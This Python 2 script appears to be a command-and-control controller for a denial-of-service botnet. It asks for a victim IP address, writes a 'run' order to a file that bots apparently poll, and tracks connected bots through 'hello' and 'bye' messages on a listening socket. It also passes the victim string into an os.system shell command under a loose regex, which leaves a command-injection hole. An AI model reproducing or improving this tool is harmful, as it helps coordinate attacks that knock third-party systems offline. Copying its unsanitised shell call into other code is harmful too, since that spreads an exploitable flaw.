import socket
import time
import atexit
import sys
from  os import system as command
import re

host = ''        # Symbolic name meaning all available interfaces
port = 12345     # Arbitrary non-privileged port


def goodbye():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except:
        pass
    command("echo 'stop' > ./attack.txt")
    s.close()

atexit.register(goodbye)



def menu():
    print("************MAIN MENU**************")
    print()
    choice = raw_input("""
1: Start Attack
2: Listen for new bots
3: Quit/Log Out

Please enter your choice: """)
    print(choice)
    if choice == "1":
        startAttack()
    elif choice == "2":
        #listen()
        pass
    elif choice == "3":
        sys.exit
    else:
        print("You must only select either 1,2 or 3")
        print("Please try again")
        menu()



def startAttack():
    victim = raw_input("Enter ip of victim: ")
    r = re.compile(r'.{1,3}[.].{1,3}[.].{1,3}[.].{1,3}$')
    if r.match(victim):
        command("echo 'run;" + victim + "' > ./attack.txt")
        time.sleep(5)
        attack()
    else:
        print("Only input ip addresses")
        startAttack()



def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind((host, port))
    print(host , port)
    totalConections = 0
    while True:
        s.listen(1)
        conn, addr = s.accept()
        


        try:
            data = conn.recv(1024)

            if not data: break

            if data == 'bye':
                totalConections -= 1
                print(addr[0] + " disconnected from attack. Total connected: {num}".format(num=totalConections))
                continue
            
            if data == 'hello':
                totalConections += 1
                print(addr[0] + " started attaking. Total connected: {num}".format(num=totalConections))

            

        except socket.error:
            print("Error Occured.")

        conn.close()
        time.sleep(.5)


command("clear")
startAttack()